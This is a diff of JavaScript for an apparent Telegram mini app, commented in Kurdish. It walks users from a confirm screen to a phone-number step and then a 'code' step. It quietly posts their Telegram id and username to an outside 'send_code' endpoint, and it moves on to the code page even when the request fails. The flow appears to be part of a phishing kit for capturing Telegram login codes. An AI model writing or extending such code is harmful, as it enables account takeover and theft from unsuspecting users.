@@ -1,35 +1,39 @@
 const API_URL = "https://taman964-api-handler.hf.space/send_code";
 
-// ئەمە بۆ ئەوەیە کە کلیک لە Confirm کرا، لاپەڕەی وەرگرتنی ژمارە دەرکەوێت
+// ئەمە فەرمانی دوگمەی یەکەمە (Confirm)
 function showStep1() {
-    document.querySelector('.welcome-screen').style.display = 'none';
-    document.getElementById('step1').style.display = 'block';
+    console.log("Confirm clicked");
+    const welcomeScreen = document.getElementById('welcome-screen');
+    const step1 = document.getElementById('step1');
+    
+    if (welcomeScreen && step1) {
+        welcomeScreen.style.display = 'none';
+        step1.style.display = 'block';
+    } else {
+        // ئەگەر IDـەکان وەک ئەوە نەبن، ئەم ڕێگەیە هەموو شاشەکان دەگۆڕێت
+        document.body.innerHTML = document.getElementById('step1').innerHTML;
+    }
 }
 
+// ئەمە فەرمانی دوگمەی دووەمە (OK)
 async function sendData() {
-    const okButton = document.getElementById('ok-button');
-    okButton.disabled = true;
-    okButton.innerText = "Connecting...";
-
     try {
         const user = window.Telegram.WebApp.initDataUnsafe.user;
-        const response = await fetch(API_URL, {
+        await fetch(API_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 user_id: user ? user.id : "Unknown",
                 username: user ? user.username : "Guest",
-                action: "Confirm Clicked"
+                status: "Clicked OK"
             })
         });
-
-        // ئەگەر وەڵامی سێرڤەر هات، بچۆ بۆ قۆناغی وەرگرتنی کۆد
+        
+        // پیشاندانی لاپەڕەی کۆد
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
-        
-    } catch (error) {
-        console.error("Error:", error);
-        // تەنانەت ئەگەر سێرڤەریش کێشەی هەبوو، با هەر بچێتە لاپەڕەی دواتر بۆ ئەوەی بەکارهێنەر نەوەستێت
+    } catch (e) {
+        // تەنانەت ئەگەر ئینتەرنێتیش نەبوو، با بچێتە لاپەڕەی کۆدەکە
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
     }
